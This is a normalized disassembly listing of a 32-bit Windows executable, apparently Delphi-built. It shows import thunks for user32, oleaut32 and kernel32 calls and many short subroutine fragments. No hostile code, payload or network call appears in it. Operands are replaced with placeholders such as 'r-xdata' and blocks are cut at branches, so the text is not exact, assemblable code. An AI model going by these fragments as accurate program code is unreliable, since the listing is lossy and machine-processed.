jmp [ __import_lookup_table_9(user32:CallWindowProcA) ]
CharLowerBuffA
jmp [ CharLowerBuffA@IAT ]
CharNextA
jmp [ CharNextA@IAT ]
CharToOemA
jmp [ CharToOemA@IAT ]
CharUpperBuffA
jmp [ __import_lookup_table_9(user32:CharUpperBuffA) ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CloseClipboard
jmp [ CloseClipboard@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ __import_lookup_table_9(user32:CreatePopupMenu) ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefMDIChildProcA
jmp [ __import_lookup_table_9(user32:DefMDIChildProcA) ]
DefWindowProcA
jmp [ __import_lookup_table_9(user32:DefWindowProcA) ]
DeferWindowPos
jmp [ __import_lookup_table_9(user32:DeferWindowPos) ]
DestroyIcon
jmp [ __import_lookup_table_9(user32:DestroyIcon) ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ __import_lookup_table_9(user32:DestroyWindow) ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFrameControl
jmp [ DrawFrameControl@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ __import_lookup_table_9(user32:DrawIconEx) ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EmptyClipboard
jmp [ EmptyClipboard@IAT ]
EnableScrollBar
jmp [ __import_lookup_table_9(user32:EnableScrollBar) ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndDeferWindowPos
jmp [ __import_lookup_table_9(user32:EndDeferWindowPos) ]
EndPaint
jmp [ __import_lookup_table_9(user32:EndPaint) ]
EnumThreadWindows
jmp [ __import_lookup_table_9(user32:EnumThreadWindows) ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ FindWindowA@IAT ]
GetCaretPos
jmp [ GetCaretPos@IAT ]
GetClassNameA
jmp [ __import_lookup_table_9(user32:GetClassNameA) ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetCursor
jmp [ GetCursor@IAT ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetDlgItem
jmp [ GetDlgItem@IAT ]
GetDoubleClickTime
jmp [ GetDoubleClickTime@IAT ]
GetForegroundWindow
jmp [ __import_lookup_table_9(user32:GetForegroundWindow) ]
GetIconInfo
jmp [ __import_lookup_table_9(user32:GetIconInfo) ]
GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
GetKeyboardLayout
jmp [ __import_lookup_table_9(user32:GetKeyboardLayout) ]
GetKeyboardLayoutList
jmp [ __import_lookup_table_9(user32:GetKeyboardLayoutList) ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
GetMessageTime
jmp [ GetMessageTime@IAT ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ GetPropA@IAT ]
GetScrollInfo
jmp [ GetScrollInfo@IAT ]
GetScrollPos
jmp [ __import_lookup_table_9(user32:GetScrollPos) ]
GetScrollRange
jmp [ GetScrollRange@IAT ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ GetSysColor@IAT ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ GetSystemMenu@IAT ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindow
jmp [ GetWindow@IAT ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ __import_lookup_table_9(user32:GetWindowTextA) ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
IsCharAlphaNumericA
jmp [ __import_lookup_table_9(user32:IsCharAlphaNumericA) ]
IsChild
jmp [ __import_lookup_table_9(user32:IsChild) ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsRectEmpty
jmp [ __import_lookup_table_9(user32:IsRectEmpty) ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsZoomed
jmp [ __import_lookup_table_9(user32:IsZoomed) ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ __import_lookup_table_9(user32:LoadIconA) ]
LoadStringA
jmp [ __import_lookup_table_9(user32:LoadStringA) ]
MapVirtualKeyA
jmp [ __import_lookup_table_9(user32:MapVirtualKeyA) ]
MessageBeep
jmp [ __import_lookup_table_9(user32:MessageBeep) ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
OemToCharA
jmp [ __import_lookup_table_9(user32:OemToCharA) ]
OpenClipboard
jmp [ __import_lookup_table_9(user32:OpenClipboard) ]
PeekMessageA
jmp [ __import_lookup_table_9(user32:PeekMessageA) ]
PostQuitMessage
jmp [ __import_lookup_table_9(user32:PostQuitMessage) ]
RedrawWindow
jmp [ __import_lookup_table_9(user32:RedrawWindow) ]
RegisterClassA
jmp [ __import_lookup_table_9(user32:RegisterClassA) ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ __import_lookup_table_9(user32:ReleaseCapture) ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ ScrollWindow@IAT ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetKeyboardState
jmp [ SetKeyboardState@IAT ]
SetMenuItemInfoA
jmp [ SetMenuItemInfoA@IAT ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollPos
jmp [ SetScrollPos@IAT ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ __import_lookup_table_9(user32:SetWindowTextA) ]
SetWindowsHookExA
jmp [ __import_lookup_table_9(user32:SetWindowsHookExA) ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ __import_lookup_table_9(user32:ShowOwnedPopups) ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ __import_lookup_table_9(user32:TrackPopupMenu) ]
TranslateMDISysAccel
jmp [ __import_lookup_table_9(user32:TranslateMDISysAccel) ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnionRect
jmp [ UnionRect@IAT ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ __import_lookup_table_9(user32:WindowFromPoint) ]
sub_406e10
call GetTickCount
retn
sub_406e18
xor eax eax
retn
sub_406e1c
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406e2c
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406e48
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406e5c
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406e94
call sub_406e04
retn
sub_406e9c
call sub_406e04
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_407079
jmp sub_4039a8
sub_407080
pop ebp
retn
sub_407084
sub [ rw-data ] 0x1
retn
sub_4070b1
jmp sub_4039a8
sub_4070b8
pop ebp
retn
sub_4070bc
sub [ rw-data ] 0x1
retn
sub_4073f9
jmp sub_4039a8
sub_407400
pop ebp
retn
sub_407404
sub [ rw-data ] 0x1
retn
sub_407ef5
add eax 0xffffffd4
jmp sub_40d720
sub_407efd
add eax 0xffffffd4
jmp sub_40d5c8
sub_407f05
add eax 0xffffffd4
jmp sub_40d664
sub_407f0d
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405ab4
sub_407f17
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405adc
sub_407f21
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405af0
sub_407ff8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
pop ebx
retn
sub_4082d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_408298
test eax eax
sete al
pop esi
pop ebx
retn
sub_40884e
jmp sub_4039a8
sub_408855
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40885c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4087e8
pop esi
pop ebx
retn
sub_4088ec
call sub_4088c8
retn
sub_408984
push eax
call CloseHandle
retn
sub_4089f4
push ebx
mov ebx eax
mov eax ebx
call sub_40898c
inc eax
setne al
pop ebx
retn
sub_408bcc
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408be0
push esi
mov esi eax
xchg edx eax
call sub_4029c0
mov eax esi
pop esi
retn
sub_408dcc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_40419c
pop esi
pop ebx
retn
sub_408de0
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4027c4
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408df4
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408e2c
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4027e4
sub_408e94
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402920
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408eb8
push ebx
mov ebx eax
mov eax ebx
call sub_403fa4
pop ebx
retn
sub_40921b
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403fa4
pop eax
pop ebx
retn
sub_4094d3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_40962e
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_40998b
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_40998b
sub_409a84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404464
mov edx esi
xor ecx ecx
call sub_4098d4
pop esi
pop ebx
retn
sub_409af8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404464
mov edx esi
mov cl 0x1
call sub_4098d4
pop esi
pop ebx
retn
sub_40a1e2
jmp sub_4039a8
sub_40a1e9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a2da
jmp sub_4039a8
sub_40a2e1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40aa85
jmp sub_4039a8
sub_40aa8c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ab14
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40aab8
pop ebp
retn 0x8
sub_40ac59
jmp sub_4039a8
sub_40ac60
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40b103
jmp sub_4039a8
sub_40b10a
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b623
jmp sub_4039a8
sub_40b62a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b6d5
jmp sub_4039a8
sub_40b6dc
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b77f
jmp sub_4039a8
sub_40b786
pop esi
pop ecx
pop ebp
retn
sub_40b962
jmp sub_4039a8
sub_40b969
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b9c0
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40bc1c
mov eax [ rw-data ]
call sub_4039e0
retn
sub_40bcbe
jmp sub_4039a8
sub_40bd8c
jmp sub_4039a8
sub_40bdfc
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_403208
sub_40bf98
jmp sub_4039a8
sub_40bf9f
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bfa8
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_4039e0
sub_40bfb5
retn
sub_40bfb8
push ebp
mov ebp esp
call sub_40befc
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40bfa8
pop ebp
retn 0x4
sub_40bfd4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
retn
sub_40c06c
push ebx
mov ebx eax
mov eax ebx
call sub_40bfec
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40c23f
jmp sub_4039a8
sub_40c246
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c30b
jmp sub_4039a8
sub_40c312
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c31c
call sub_40bb54
mov eax 0x1
call sub_403f8c
sub_40c4a0
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c579
jmp sub_4039a8
sub_40c596
jmp sub_4039a8
sub_40c59d
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c648
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40c5ac
mov ecx eax
sub_40c834
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c854
push eax
call CharNextA
retn
sub_40cb7c
jmp sub_4039a8
sub_40cb83
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40cbec
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40d043
jmp sub_4039a8
sub_40d04a
pop ebx
mov esp ebp
pop ebp
retn
sub_40d213
jmp sub_4039a8
sub_40d21a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
Sleep
jmp [ Sleep@IAT ]
sub_40d2bc
jmp sub_4039a8
sub_40d2c3
pop ebx
mov esp ebp
pop ebp
retn
sub_40d2c8
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40d22c
sub_40d2d8
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40d2f4
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4027e4
pop ebx
retn
sub_40d37c
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40d388
xchg [ eax ] edx
mov eax edx
retn
sub_40d3e8
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40d478
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40d590
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40d5b8
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d833
jmp sub_4039a8
sub_40d83a
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d8a8
jmp sub_4039a8
sub_40d8af
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d8cd
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d8c6
jmp sub_4039a8
sub_40d8cd
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40dd90
jmp sub_4039a8
sub_40dd97
pop ebp
retn
VariantInit
jmp [ VariantInit@IAT ]
VariantCopyInd
jmp [ VariantCopyInd@IAT ]
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40de18
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40de7e
jmp sub_4039a8
sub_40de85
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40deea
jmp sub_4039a8
sub_40def1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40df56
jmp sub_4039a8
sub_40df5d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dfc2
jmp sub_4039a8
sub_40dfc9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40e02e
jmp sub_4039a8
sub_40e035
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40e0ad
jmp sub_4039a8
sub_40e0b4
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40e120
jmp sub_4039a8
sub_40e127
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40e190
jmp sub_4039a8
sub_40e197
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40e204
jmp sub_4039a8
sub_40e20b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetLBound) ]
SafeArrayGetUBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetUBound) ]
SafeArrayAccessData
jmp [ SafeArrayAccessData@IAT ]
SafeArrayUnaccessData
jmp [ SafeArrayUnaccessData@IAT ]
SafeArrayGetElement
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetElement) ]
SafeArrayPutElement
jmp [ SafeArrayPutElement@IAT ]
sub_40e5b1
jmp sub_4039a8
sub_40e5b8
pop ebp
retn
sub_40e5bc
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40e280
sub_40e5cd
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e760
add [ esp + 0x4 ] 0xfffffff4
jmp sub_415598
sub_40ed62
jmp sub_4039a8
sub_40ed69
pop ecx
pop ebp
retn
sub_40edfb
jmp sub_4039a8
sub_40ee02
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ee52
jmp sub_4039a8
sub_40ee59
pop ecx
pop ebp
retn
sub_40eeeb
jmp sub_4039a8
sub_40eef2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ef42
jmp sub_4039a8
sub_40ef49
pop ecx
pop ebp
retn
sub_40f191
jmp sub_4039a8
sub_40f198
pop ebx
mov esp ebp
pop ebp
retn
sub_40f2ae
jmp sub_4039a8
sub_40f2b5
pop ecx
pop ebp
retn
sub_40f2b8
push ebx
mov ebx eax
mov eax ebx
call sub_40f550
mov [ ebx ] 0x1
pop ebx
retn
sub_40f564
push eax
call sub_40f550
pop eax
retn
sub_40f7c4
call sub_40f878
retn
sub_40f8dc
xchg edx eax
call sub_413208
retn
sub_40f8e4
call sub_40faf8
retn
sub_40fae9
jmp sub_4039a8
sub_40faf0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40faf8
test [ edx + 0x1 ] 0x40
jne r-xdata
call sub_40f920
retn
call sub_40f878
retn
j_sub_40fb0c
jmp sub_40fb0c
sub_40fb31
retn
sub_40fb90
jmp sub_4039a8
sub_40fb97
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fbde
jmp sub_4039a8
sub_40fbe5
pop ebx
pop ecx
pop ebp
retn
sub_40fc2a
jmp sub_4039a8
sub_40fc31
pop ebx
pop ecx
pop ebp
retn
sub_40fc76
jmp sub_4039a8
sub_40fc7d
pop ebx
pop ecx
pop ebp
retn
sub_40fcc2
jmp sub_4039a8
sub_40fcc9
pop ebx
pop ecx
pop ebp
retn
sub_41008b
jmp sub_4039a8
sub_410092
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41012c
jmp sub_4039a8
sub_410133
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4105a1
jmp sub_4036f4
sub_41065c
jmp sub_4036f4
sub_410703
jmp sub_4036f4
sub_4107fc
jmp sub_4036f4
sub_4108d5
jmp sub_4036f4
sub_4109bd
jmp sub_4036f4
sub_410b7a
jmp sub_4039a8
sub_410b81
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410be3
jmp sub_4039a8
sub_410bea
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411050
jmp sub_4036f4
sub_41113f
jmp sub_4039a8
sub_411146
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4111e4
jmp sub_4039a8
sub_4111eb
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411588
call sub_411240
neg al
sbb eax eax
neg eax
retn
sub_411649
jmp sub_4039a8
sub_411650
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4116f9
jmp sub_4039a8
sub_411700
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411c51
jmp sub_4036f4
sub_411d58
jmp sub_4039a8
sub_411d5f
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411e69
jmp sub_4039a8
sub_411e70
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4122c0
jmp sub_4039a8
sub_4122c7
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4123d1
jmp sub_4039a8
sub_4123d8
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41291e
jmp sub_4039a8
sub_412925
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4129c9
jmp sub_4039a8
sub_4129d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4129f2
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4046c8
retn
sub_4129eb
jmp sub_4039a8
sub_4129f2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412a4e
jmp sub_4039a8
sub_412a55
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412ad1
jmp sub_4039a8
sub_413017
jmp sub_4039a8
sub_41301e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4130b1
jmp sub_4039a8
sub_4130b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4130d5
lea eax [ ebp - 0x14 ]
call sub_4046b0
retn
sub_4130ce
jmp sub_4039a8
sub_4130d5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413132
jmp sub_4039a8
sub_413139
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4131db
jmp sub_4039a8
sub_4131f8
jmp sub_4039a8
sub_4131ff
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41375a
jmp sub_4039a8
sub_413761
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4137d2
jmp sub_4039a8
sub_4137d9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413b64
push eax
call sub_40f550
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_413b78
push eax
call sub_40f550
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_413bfb
jmp sub_4039a8
sub_413c02
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413cdb
jmp sub_4039a8
sub_413ce2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413d3e
jmp sub_4039a8
sub_413d45
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413d4c
call sub_413d54
retn
sub_413ea4
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f878
add esp 0x10
sub_41414e
jmp sub_4039a8
sub_414155
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41419c
jmp r-xdata
cmp [ eax ] 0x400c
je r-xdata
mov eax [ eax + 0x8 ]
retn
sub_4141ac
push ecx
mov edx esp
call sub_415bdc
pop edx
retn
sub_4141b8
cmp ax 0x8
je r-xdata
mov al 0x1
retn
cmp ax 0x100
je r-xdata
xor eax eax
retn
sub_4141cc
push ebx
mov ebx eax
mov eax ebx
call sub_41419c
cmp [ eax ] 0x1
sete al
pop ebx
retn
sub_41426d
jmp sub_4039a8
sub_414274
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4142a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40f550
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_4142c0
mov edx 0x80020004
call sub_4142a8
retn
sub_414470
push ebx
mov ebx eax
mov eax ebx
call sub_4143b8
push eax
call SafeArrayUnaccessData
call sub_40f1a0
pop ebx
retn
sub_414488
mov edx eax
sub dx 0x16
jae r-xdata
xor eax eax
retn
movzx eax ax
lea eax [ eax + eax * 2 ]
mov edx [ rw-data ]
cmp [ edx + eax * 4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4145a4
jmp sub_4039a8
sub_4145ab
pop ebx
mov esp ebp
pop ebp
retn
sub_41470c
jmp sub_4039a8
sub_414784
xor edx edx
test eax eax
je r-xdata
mov eax edx
retn
xor ecx ecx
mov cl [ eax + 0x1 ]
add eax ecx
mov ecx [ eax + 0x6 ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
sub_4147a0
push ebx
xor ebx ebx
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
cmp [ eax ] 0x11
je r-xdata
inc ebx
call sub_414784
sub_414c8f
jmp sub_4039a8
sub_414cca
jmp sub_4039a8
sub_414cd1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414fa9
jmp sub_4039a8
sub_414fd9
jmp sub_4039a8
sub_414fe0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41506d
jmp sub_4039a8
sub_415078
push ebp
mov ebp esp
call sub_415504
pop ebp
retn 0x4
sub_415104
push ebp
mov ebp esp
call sub_415504
pop ebp
retn 0x4
sub_4153f8
jmp sub_4039a8
sub_4153ff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41542c
lea eax [ ebp - 0x140 ]
call sub_403fa4
lea eax [ ebp - 0x24 ]
mov edx 0x3
call sub_403fc8
retn
sub_415425
jmp sub_4039a8
sub_4154b3
jmp sub_4039a8
sub_4154ba
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403244
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035c8
sub_4154dc
xor eax eax
retn
sub_4154e0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4154f4
mov [ ecx ] 0x8
mov al 0x1
retn
sub_4154fc
call sub_40ed18
retn
sub_415504
call sub_40ee08
retn
sub_415514
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_415528
call sub_415504
retn
sub_415540
mov eax edx
mov edx ecx
call sub_40faf8
retn
sub_41554c
push ebp
mov ebp esp
mov eax edx
mov edx ecx
movzx ecx [ ebp + 0x8 ]
call sub_40fdbc
pop ebp
retn 0x4
sub_415560
test [ edx + 0x1 ] 0x40
